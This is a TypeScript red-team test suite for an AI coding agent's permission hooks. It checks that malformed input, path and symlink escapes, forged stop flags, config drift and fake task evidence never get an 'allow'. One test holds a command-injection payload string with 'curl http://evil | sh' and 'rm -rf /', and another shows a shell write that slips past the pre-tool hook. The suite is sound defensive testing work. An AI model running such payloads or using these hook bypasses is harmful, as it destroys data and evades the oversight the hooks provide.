/**
 * T-167 / ADR-013 §2、§4–§5 / S8：钩子边界红队。
 *
 * 方法：先尝试钻，再断言钻不进。每个场景都在 os.tmpdir() 下的隔离 Git 项目
 * 与独立 HOME 中执行，不写仓库自身的 .pm/、.ano/ 或用户级配置。
 *
 * 攻击矩阵（实施规格 T-167 / .pm/tasks.json T-167 steps）：
 *   1. 非法 stdin / 超 1 MiB / 深嵌套 / 缺 session_id → ask/deny 不 allow；
 *   2. targetPaths 的 `..`、绝对逃逸、UNC、symlink/junction → ask 不 allow；
 *   3. tool_input 里的 shell 元字符与换行不进入任何命令行；
 *   4. 慢 IO（永不返回的 stdin）触发硬超时并降级；
 *   5. 伪造 stopContinuation=false 反复 stop，最多 2 次 continue；
 *   6. pre-tool 路径零账本写入（段文件数与 views.db 字节不变）；
 *   7. 安装 beforeHash 漂移拒绝且并发写入字节原样保留；
 *   8. shell 写文件绕过 pre-tool（如实放行）但被 stop 的 C1 检出；
 *   9. 自动摘要（session_summary / hook:auto）不能作为 Gate evidence_id 完成。
 *
 * 已实测并修复的真实缺陷（回归断言附在对应攻击里）：
 *   F-01：pre-tool 规则 1 只做词法 containment，跟随 symlink/junction 后指向
 *         项目根外的已存在文件仍被 allow；现在按 realpath 复核（T-167/02b）。
 *   F-02：CLI 硬超时只包住 decideHook，不含 stdin 读取与 adapter 解析，
 *         慢/永不返回的 stdin 可无限挂住宿主线程；现在整条管线进超时（T-167/04）。
 */

import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import test, { type TestContext } from 'node:test';

import { runCli } from '../../src/surface/cli.ts';
import { Ledger } from '../../src/ledger/ledger.ts';
import { replayLedger } from '../../src/ledger/replay.ts';
import { defaultViewsPath } from '../../src/memory/explored-state.ts';
import { decidePreTool, type PreToolContext } from '../../src/hooks/pre-tool.ts';
import {
  hookDecisionSchema,
  type HookDecision,
  type HookInput,
  type HookMode,
} from '../../src/hooks/contract.ts';
import { parseZcodeStdin, renderZcodeDecision } from '../../src/hooks/adapters/zcode.ts';
import { onSessionStart, onStop, type SessionEngineContext } from '../../src/hooks/session.ts';
import {
  buildHooksDocument,
  buildHookCommand,
  installClientHooks,
  resolveHooksTarget,
} from '../../src/clients/install.ts';
import * as configModule from '../../src/clients/config.ts';
import type { ClientConfigAuthorization, ClientHooksTarget } from '../../src/clients/config.ts';
import { trackTaskUpdate } from '../../src/surface/service.ts';
import { noteSurface } from '../../src/surface/memory.ts';
import type { Freshness } from '../../src/structure/types.ts';

const FRESH: Freshness = { status: 'fresh', stale: 0 };
const REV = 'rev-current';

function rootFor(t: TestContext, prefix = 'ano-hooks-redteam-'): string {
  const root = mkdtempSync(join(tmpdir(), prefix));
  t.after(() => {
    for (let attempt = 0; ; attempt += 1) {
      try { rmSync(root, { recursive: true, force: true }); return; }
      catch { if (attempt >= 9) return; Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 100); }
    }
  });
  return root;
}

function sha256(value: Buffer | string): string {
  return createHash('sha256').update(value).digest('hex');
}

function git(root: string, args: readonly string[]): void {
  const result = spawnSync('git', ['-C', root, ...args], { encoding: 'utf8', windowsHide: true });
  assert.equal(result.status, 0, `git ${args.join(' ')}: ${result.stderr ?? result.stdout}`);
}

async function gitProject(t: TestContext): Promise<string> {
  const root = rootFor(t, 'ano-hooks-redteam-git-');
  for (const [path, content] of Object.entries({
    '.gitignore': '.ano/\n',
    'package.json': JSON.stringify({ name: 'hooks-redteam-fixture', private: true }, null, 2),
    'src/existing.ts': 'export const existing = 1;\n',
  })) {
    const absolute = join(root, ...path.split('/'));
    mkdirSync(dirname(absolute), { recursive: true });
    writeFileSync(absolute, content);
  }
  for (const args of [
    ['init', '-q', '-b', 'main'],
    ['config', 'user.email', 'ano@localhost'],
    ['config', 'user.name', 'ano'],
    ['add', '.'],
    ['commit', '-qm', 'base'],
  ]) git(root, args);
  return root;
}

function hookInput(targetPaths: string[], extra: Partial<HookInput> = {}): HookInput {
  return { event: 'pre-tool', client: 'zcode', hostSessionId: 'sess-redteam', cwd: '/', targetPaths, ...extra };
}

function preCtx(root: string, overrides: Partial<PreToolContext> = {}): PreToolContext {
  return {
    mode: 'advisory',
    root,
    freshness: FRESH,
    revision: REV,
    exists: () => true,
    exploredFiles: [],
    ...overrides,
  };
}

function sessionInput(hostSessionId: string, event: HookInput['event'], cwd: string, extra: Partial<HookInput> = {}): HookInput {
  return { event, client: 'zcode', hostSessionId, cwd, ...extra };
}

function sessionCtx(ledger: Ledger): SessionEngineContext {
  return { ledger, mode: 'advisory' };
}

function zcodeStdin(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    hook_event_name: 'PreToolUse',
    session_id: 'sess-redteam',
    cwd: process.cwd(),
    tool_name: 'Write',
    tool_input: { file_path: 'src/existing.ts' },
    ...overrides,
  };
}

/** 运行 CLI hook，返回宿主 stdout 的 permissionDecision 与退出码。 */
async function runHook(
  root: string,
  stdin: string,
  mode: HookMode = 'advisory',
): Promise<{ decision: string; exitCode: number; stdout: string }> {
  const result = await runCli(
    ['hook', 'pre-tool', '--client', 'zcode', '--root', root, '--mode', mode],
    { hookStdin: async () => stdin },
  );
  let decision = '<non-json>';
  try {
    const parsed = JSON.parse(result.output) as Record<string, unknown>;
    const specific = parsed['hookSpecificOutput'] as Record<string, unknown> | undefined;
    decision = typeof specific?.['permissionDecision'] === 'string' ? String(specific['permissionDecision']) : '<missing>';
  } catch { /* 非 JSON 也是一种失败信号，绝不视为 allow */ }
  return { decision, exitCode: result.code, stdout: result.output };
}

// ---------------------------------------------------------------------------
// 1. 非法 stdin / 超 1 MiB / 深嵌套 / 缺 session_id → ask/deny 不 allow
// ---------------------------------------------------------------------------

test('T-167/01 攻击：非法 JSON、非对象、超 1 MiB、深层嵌套、缺 session_id 均不 allow', async (t) => {
  const root = rootFor(t);
  const oversized = JSON.stringify(zcodeStdin({ hostExtra: { pad: 'x'.repeat(1024 * 1024 + 64) } }));
  const deep = JSON.stringify(zcodeStdin({ hostExtra: { nest: Array(40_000).fill('x') } }));
  const attacks: Array<[string, string]> = [
    ['非 JSON', 'not-json-at-all'],
    ['非对象 JSON', '[]'],
    ['缺 session_id', JSON.stringify(zcodeStdin({ session_id: undefined }))],
    ['空 session_id', JSON.stringify(zcodeStdin({ session_id: '' }))],
    ['未知事件', JSON.stringify(zcodeStdin({ hook_event_name: 'ClipboardChange' }))],
    ['未知顶层字段', JSON.stringify(zcodeStdin({ injected_field: 'attacker' }))],
    ['超 1 MiB', oversized],
    ['深层嵌套', deep],
    ['合法输入（对照组）', JSON.stringify(zcodeStdin())],
  ];
  for (const mode of ['advisory', 'strict'] as HookMode[]) {
    for (const [label, stdin] of attacks) {
      const outcome = await runHook(root, stdin, mode);
      assert.notEqual(outcome.decision, 'allow', `${mode} / ${label} 必须不 allow：${outcome.stdout}`);
      assert.ok(
        outcome.decision === 'ask' || outcome.decision === 'deny',
        `${mode} / ${label} 必须显式降级为 ask/deny，实际 ${outcome.decision}`,
      );
      assert.match(outcome.stdout, /ANO 钩子降级|没有结构探查证据/u, `${mode} / ${label} 必须给出降级理由`);
      if (mode === 'strict') assert.equal(outcome.exitCode, 2, `${mode} / ${label} strict 必须 deny 退出码 2`);
    }
  }
});

test('T-167/01b 攻击：ZCode 适配器对缺字段/未知字段直接抛错，不产出半成品', () => {
  for (const stdin of [
    'null',
    '[]',
    '{}',
    JSON.stringify({ hook_event_name: 'PreToolUse', cwd: process.cwd() }),
    JSON.stringify(zcodeStdin({ hook_event_name: 'PreToolUse', session_id: '' })),
  ]) {
    const parsed = (() => { try { return parseZcodeStdin(stdin); } catch { return null; } })();
    assert.equal(parsed, null, `stdin=${stdin.slice(0, 80)} 必须被拒绝`);
  }
  const ask = renderZcodeDecision({ kind: 'ask', reason: 'degraded' }, 'pre-tool');
  assert.equal((JSON.parse(ask.stdout) as Record<string, unknown>)['hookSpecificOutput']?.toString().includes('"allow"'), false);
});

// ---------------------------------------------------------------------------
// 2. targetPaths .. / 绝对逃逸 / UNC / symlink/junction → ask 不 allow
// ---------------------------------------------------------------------------

test('T-167/02 攻击：..、绝对路径、UNC 路径在 advisory/strict 都 ask，且带 HOOK_ROOT_AMBIGUOUS', () => {
  const root = 'F:\\ano-redteam-root';
  const backslash = String.fromCharCode(92);
  const targets = [
    '..' + backslash + 'outside.ts',
    'src' + backslash + '..' + backslash + '..' + backslash + 'escape.ts',
    'F:' + backslash + 'outside' + backslash + 'secret.ts',
    'C:' + backslash + 'windows.ts',
    backslash + backslash + 'server' + backslash + 'share' + backslash + 'file.ts',
    '//server/share/file.ts',
    '',
  ];
  for (const mode of ['advisory', 'strict'] as HookMode[]) {
    for (const target of targets) {
      const decision = decidePreTool(hookInput([target]), preCtx(root, { mode }));
      assert.equal(decision.kind, 'ask', `${mode} / ${target}`);
      assert.equal(decision.degraded?.code, 'HOOK_ROOT_AMBIGUOUS', `${mode} / ${target}`);
      assert.equal(hookDecisionSchema.safeParse(decision).success, true);
    }
  }
});

test('T-167/02b 攻击（F-01 回归）：symlink/junction 指向根外的已存在文件必须 ask，不能 allow', (t) => {
  const root = rootFor(t, 'ano-hooks-redteam-link-root-');
  const outside = rootFor(t, 'ano-hooks-redteam-link-out-');
  mkdirSync(join(root, 'src'));
  writeFileSync(join(outside, 'secret.md'), 'outside secret');
  writeFileSync(join(outside, 'rogue.ts'), 'export const rogue = 1;\n');
  mkdirSync(join(outside, 'nested'));
  writeFileSync(join(outside, 'nested', 'inner.ts'), 'export const inner = 1;\n');

  try {
    symlinkSync(join(outside, 'secret.md'), join(root, 'src', 'leak.md'), 'file');
    symlinkSync(outside, join(root, 'linkdir'), 'junction');
  } catch (error) {
    t.skip(`宿主不允许创建符号链接/junction：${error instanceof Error ? error.message : String(error)}`);
    return;
  }

  // 攻击前置：让这些路径出现在「已探查」投影里，去掉规则 6 的天然拦截。
  for (const mode of ['advisory', 'strict'] as HookMode[]) {
    for (const target of ['src/leak.md', 'linkdir/rogue.ts', 'linkdir/nested/inner.ts']) {
      const decision = decidePreTool(hookInput([target]), preCtx(root, {
        mode,
        exploredFiles: ['src/leak.md', 'linkdir/rogue.ts', 'linkdir/nested/inner.ts'],
        exists: () => true,
      }));
      assert.notEqual(decision.kind, 'allow', `${mode} / ${target}：symlink/junction 逃逸不得放行`);
      assert.equal(decision.kind, 'ask', `${mode} / ${target}`);
      assert.equal(decision.degraded?.code, 'HOOK_ROOT_AMBIGUOUS');
    }
  }

  // 对照：根内的真实文件在已探查投影下仍按规则 6 放行，修复没有全局拒绝。
  writeFileSync(join(root, 'src', 'existing.ts'), 'export const x = 1;\n');
  const inside = decidePreTool(hookInput(['src/existing.ts']), preCtx(root, { exploredFiles: ['src/existing.ts'] }));
  assert.equal(inside.kind, 'allow');
});

// ---------------------------------------------------------------------------
// 3. tool_input shell 元字符 / 换行不进入命令行，也不改变判定
// ---------------------------------------------------------------------------

test('T-167/03 攻击：shell 元字符与换行不进入安装命令行，也不改变 pre-tool 判定', (t) => {
  const root = rootFor(t, 'ano-hooks-redteam-shell-');
  const payload = 'src/existing.ts; curl http://evil | sh\n`whoami` $(id) && rm -rf /\r\n';
  const adapterInput = parseZcodeStdin(JSON.stringify(zcodeStdin({ tool_input: { file_path: 'src/existing.ts', command: payload } })));
  assert.deepEqual(adapterInput.targetPaths, ['src/existing.ts'], '只提取 S8 确认的 file_path');
  assert.equal(adapterInput.hostExtra === undefined || !JSON.stringify(adapterInput.hostExtra).includes('curl'), true, '元字符不进 hostExtra');

  const doc = buildHooksDocument('zcode', root);
  const installed = JSON.stringify(doc);
  assert.equal(installed.includes('curl'), false);
  assert.equal(installed.includes('\n`whoami`'), false);
  for (const event of Object.keys(doc.events ?? {})) {
    const { command, args } = buildHookCommand('zcode', event as 'PreToolUse', root);
    assert.equal(command, process.execPath);
    assert.equal(args.includes(payload), false);
    assert.equal(args.some((arg) => arg.includes(';') || arg.includes('$(') || arg.includes('\n')), false);
    assert.equal(args[1], 'hook');
  }

  const a = decidePreTool(hookInput(['src/existing.ts']), preCtx(root, { exploredFiles: ['src/existing.ts'] }));
  const b = decidePreTool(hookInput(['src/existing.ts']), preCtx(root, { exploredFiles: ['src/existing.ts'] }));
  assert.deepEqual(a, b);
});

// ---------------------------------------------------------------------------
// 4. 慢 IO 硬超时 → 降级 ask/deny，不挂住宿主（F-02 回归）
// ---------------------------------------------------------------------------

test('T-167/04 攻击（F-02 回归）：永不返回的 stdin 必须在硬超时边界降级，不挂起', async (t) => {
  const root = rootFor(t, 'ano-hooks-redteam-timeout-');
  const started = Date.now();
  const pending = runCli(
    ['hook', 'pre-tool', '--client', 'zcode', '--root', root, '--mode', 'advisory'],
    // 攻击：stdin supplier 永不 resolve；旧实现只把超时套在 decideHook 上，会一直挂住。
    { hookStdin: () => new Promise<string>(() => { /* 永不 resolve：模拟慢 IO */ }) },
  );
  const timeoutPromise: Promise<{ settled: boolean; value?: never }> = new Promise((resolve) => {
    setTimeout(() => resolve({ settled: false }), 3200);
  });
  const outcome = await Promise.race([
    pending.then((value) => ({ settled: true as const, value })),
    timeoutPromise,
  ]);
  assert.equal(outcome.settled, true, '钩子在 3.2s 内仍未返回：慢 stdin 绕过了硬超时');
  if (!outcome.settled || outcome.value === undefined) {
    pending.catch(() => undefined);
    return;
  }
  assert.ok(Date.now() - started < 3200, '必须在硬超时附近返回');
  const stdout = outcome.value.output;
  const parsed = JSON.parse(stdout) as Record<string, unknown>;
  const specific = parsed['hookSpecificOutput'] as Record<string, unknown> | undefined;
  assert.equal(specific?.['permissionDecision'], 'ask', `超时必须降级 ask：${stdout}`);
  assert.match(stdout, /hook hard timeout|HOOK_TIMEOUT/u, `必须给出超时降级理由：${stdout}`);
});

// ---------------------------------------------------------------------------
// 5. 伪造 stopContinuation=false 反复 stop，最多 2 次 continue
// ---------------------------------------------------------------------------

test('T-167/05 攻击：持续伪造 stopContinuation=false 最多触发 2 次 continue', async (t) => {
  const root = await gitProject(t);
  const ledger = await Ledger.open(root);
  try {
    await onSessionStart(sessionInput('S-RED-STOP', 'session-start', root), sessionCtx(ledger));
    writeFileSync(join(root, 'src', 'rogue.ts'), 'export const rogue = 1;\n');

    const decisions: HookDecision['kind'][] = [];
    for (let attempt = 0; attempt < 6; attempt += 1) {
      // 攻击：每次都谎称「不在继续中」，试图诱导钩子无限要求继续。
      const forged = sessionInput('S-RED-STOP', 'stop', root, { stopContinuation: false });
      decisions.push((await onStop(forged, sessionCtx(ledger))).decision.kind);
    }
    assert.deepEqual(decisions, ['continue', 'continue', 'stop-ok', 'stop-ok', 'stop-ok', 'stop-ok']);
    const checks = replayLedger(join(root, '.ano', 'ledger')).entries
      .map((entry) => entry.event)
      .filter((event) => event.kind === 'session.stop_checked');
    assert.equal(checks.length, 6);
    assert.deepEqual(
      checks.map((event) => (event.payload as Record<string, unknown>)['continuations_used']),
      [1, 2, 2, 2, 2, 2],
      '账本中的 continue 计数不得超过 2',
    );

    const flagged = await onStop(sessionInput('S-RED-STOP2', 'stop', root, { stopContinuation: true }), sessionCtx(ledger));
    assert.equal(flagged.decision.kind, 'stop-ok');
  } finally { ledger.close(); }
});

// ---------------------------------------------------------------------------
// 6. pre-tool 零账本写入
// ---------------------------------------------------------------------------

test('T-167/06 攻击：pre-tool 的 allow/ask/deny/越界判定不写账本、不改 views.db', async (t) => {
  const root = await gitProject(t);
  const ledger = await Ledger.open(root);
  await ledger.append({ kind: 'session.started', payload: {
    task_id: 'session-start:baseline', host_session_id: 'baseline', client: 'zcode',
    hook_mode: 'advisory', head_commit: null, dirty_baseline: [],
    dirty_baseline_truncated: false, previous_session_unclosed: null,
  } }, 'hooks:redteam:baseline');
  ledger.close();
  const ledgerDir = join(root, '.ano', 'ledger');
  const viewsPath = defaultViewsPath(root);
  const segmentsBefore = readdirSync(ledgerDir).sort();
  const eventsBefore = replayLedger(ledgerDir).entries.length;
  const viewsBefore = existsSync(viewsPath) ? Buffer.from(readFileSync(viewsPath)) : null;

  const attempts: Array<[HookInput, PreToolContext]> = [
    [hookInput(['/outside/abs.ts']), preCtx(root)],
    [hookInput(['../escape.ts']), preCtx(root, { mode: 'strict' })],
    [hookInput(['src/existing.ts']), preCtx(root, { freshness: { status: 'stale', stale: 3 } })],
    [hookInput(['src/existing.ts']), preCtx(root, { mode: 'strict' })],
    [hookInput(['src/existing.ts']), preCtx(root, { exploredFiles: ['src/existing.ts'] })],
    [hookInput([]), preCtx(root)],
  ];
  for (const [input, ctx] of attempts) decidePreTool(input, ctx);

  assert.deepEqual(readdirSync(ledgerDir).sort(), segmentsBefore, '不得新增账本段文件');
  assert.equal(replayLedger(ledgerDir).entries.length, eventsBefore, '不得新增账本事件');
  const viewsAfter = existsSync(viewsPath) ? Buffer.from(readFileSync(viewsPath)) : null;
  assert.deepEqual(viewsAfter, viewsBefore, 'views.db 字节不得变化');

  const clean = rootFor(t, 'ano-hooks-redteam-clean-');
  decidePreTool(hookInput(['src/new.ts']), preCtx(clean, { mode: 'strict', exists: () => false }));
  assert.equal(existsSync(join(clean, '.ano', 'ledger')), false);
  assert.equal(existsSync(defaultViewsPath(clean)), false);
});

// ---------------------------------------------------------------------------
// 7. 安装 beforeHash 漂移拒绝，原文件不变
// ---------------------------------------------------------------------------

test('T-167/07 攻击：安装时并发改动配置 → 漂移拒绝且并发字节完整保留', (t) => {
  const root = rootFor(t, 'ano-hooks-redteam-drift-');
  const target: ClientHooksTarget = resolveHooksTarget('zcode', { home: root, root });
  mkdirSync(dirname(target.path), { recursive: true });
  const original = `${JSON.stringify({ mcpServers: { keep: { command: 'node', args: ['x.js'] } }, theme: 'dark' }, null, 2)}\n`;
  writeFileSync(target.path, original, 'utf8');
  const concurrent = Buffer.from('{"mcpServers":{"ano":{"command":"concurrent"}},"theme":"light"}\n');

  const authorization: ClientConfigAuthorization = {
    authorizationId: 'c'.repeat(64),
    root,
    clientId: 'zcode',
    scope: ['config', 'install'],
    grantedBy: 'Alice',
    statement: 'Authorize hooks install for redteam',
    grantedAt: '2026-11-26T00:00:00.000Z',
  };
  let concurrentBytes = concurrent;
  let driftRound = 0;
  const drift = { hooks: { afterBackup: () => {
    driftRound += 1;
    concurrentBytes = Buffer.from(JSON.stringify({
      mcpServers: { ano: { command: `concurrent-${driftRound}` } },
      theme: 'light',
    }) + '\n');
    writeFileSync(target.path, concurrentBytes);
  } } };

  const result = installClientHooks(target, buildHooksDocument('zcode', root), {
    mode: 'apply',
    confirm: true,
    root,
    authorization,
    ...drift,
  });
  assert.equal(result.applied, false);
  assert.match(result.error ?? '', /DRIFT|concurrently|失败/u, `必须报告漂移：${result.error}`);
  assert.deepEqual(readFileSync(target.path), concurrentBytes, '并发写入者的字节必须原样保留，不能被回滚覆盖');
  assert.equal(readFileSync(target.path).includes('"hooks"'), false, '漂移后不得写入钩子配置');

  const { applyClientHooks } = configModule;
  assert.throws(
    () => applyClientHooks(target, buildHooksDocument('zcode', root), {
      mode: 'apply',
      confirm: true,
      root,
      authorization,
      ...drift,
    }),
    /DRIFT|concurrently/u,
  );
  assert.deepEqual(readFileSync(target.path), concurrentBytes, '第二次漂移后并发写入字节仍原样保留');
  assert.equal(readFileSync(target.path).includes('"hooks"'), false);
});

// ---------------------------------------------------------------------------
// 8. shell 写文件绕过 pre-tool，但由 stop 的 C1 检出
// ---------------------------------------------------------------------------

test('T-167/08 攻击：shell 重定向写文件绕过 pre-tool，但 stop C1 如实检出无归属改动', async (t) => {
  const root = await gitProject(t);
  const ledger = await Ledger.open(root);
  try {
    await onSessionStart(sessionInput('S-RED-SHELL', 'session-start', root), sessionCtx(ledger));
    // 攻击：模拟宿主 shell 工具直接写文件，完全不走 pre-tool 钩子。
    const script = `require('node:fs').writeFileSync(${JSON.stringify(join(root, 'src', 'shell-rogue.ts'))}, 'export const r = 1;\\n')`;
    const written = spawnSync(process.execPath, ['-e', script], { encoding: 'utf8', windowsHide: true });
    assert.equal(written.status, 0, written.stderr);
    assert.equal(existsSync(join(root, 'src', 'shell-rogue.ts')), true);

    const stop = await onStop(sessionInput('S-RED-SHELL', 'stop', root), sessionCtx(ledger));
    assert.equal(stop.decision.kind, 'continue', '检测防线必须要求补记');
    const c1 = stop.checks.find((check) => check.id === 'C1')!;
    assert.equal(c1.ok, false);
    assert.deepEqual(c1.items, ['src/shell-rogue.ts']);
    assert.match(stop.decision.checklist.join('\n'), /src\/shell-rogue\.ts/u);
  } finally { ledger.close(); }
});

// ---------------------------------------------------------------------------
// 9. 自动摘要不能作为 Gate 证据
// ---------------------------------------------------------------------------

test('T-167/09 攻击：session_summary / hook:auto 的事件 ID 不能让 track complete 通过', async (t) => {
  const root = await gitProject(t);
  const ledger = await Ledger.open(root);
  try {
    await ledger.createTask('T-SUMMARY', ['src/existing.ts'], 'gate proof attack', 'hooks:redteam:task');
  } finally { ledger.close(); }

  // 写一条自动摘要 note（kind=session_summary，无 Anchor），拿到真实事件 ID。
  const noteLedger = await Ledger.open(root);
  let eventId: string | null = null;
  try {
    const noted = await noteSurface(noteLedger, {
      idem_key: 'hooks:redteam:summary',
      kind: 'session_summary',
      text: JSON.stringify({ host_session_id: 'S-RED', client: 'zcode', source: 'hook:auto' }),
    });
    eventId = noted.eventId;
  } finally { noteLedger.close(); }
  const fakeEvidenceId = eventId ?? 'unknown-event-id';

  await assert.rejects(
    trackTaskUpdate(root, {
      operation: 'complete', id: 'T-SUMMARY', evidence_id: fakeEvidenceId,
    }, 'hooks:redteam:complete'),
    /Gate evidence|not recorded|没有记录/u,
    '自动摘要事件 ID 不得被当作 Gate evidence_id',
  );

  await assert.rejects(
    trackTaskUpdate(root, {
      operation: 'complete', id: 'T-SUMMARY', evidence_id: '11111111-2222-4333-8444-555555555555',
    }, 'hooks:redteam:complete-forged'),
    /Gate evidence|not recorded|没有记录/u,
  );

  const ledger2 = await Ledger.open(root);
  try {
    const task = ledger2.getTask('T-SUMMARY')!;
    assert.equal(task.status, 'todo', '任务状态未因摘要冒充证据而变成 done');
    const doneEvents = replayLedger(join(root, '.ano', 'ledger')).entries
      .map((entry) => entry.event)
      .filter((event) => event.kind === 'task.updated' && (event.payload as Record<string, unknown>)['status'] === 'done');
    assert.equal(doneEvents.length, 0, '不得新增 done 事件');
  } finally { ledger2.close(); }
});

// ---------------------------------------------------------------------------
// 10. 覆盖率锚：确认红队测试引用了真实源码，避免"测试跑通但没碰到攻击面"
// ---------------------------------------------------------------------------

test('T-167/10 攻击矩阵锚：所有被测入口均来自真实实现（防桩替换）', () => {
  assert.equal(typeof decidePreTool, 'function');
  assert.equal(typeof runCli, 'function');
  assert.equal(typeof onStop, 'function');
  assert.equal(typeof installClientHooks, 'function');
  assert.equal(typeof configModule.applyClientHooks, 'function');
  assert.equal(typeof trackTaskUpdate, 'function');
  assert.equal(typeof sha256('x'), 'string');
  assert.equal(resolve('C:/tmp/x').endsWith('x'), true);
});
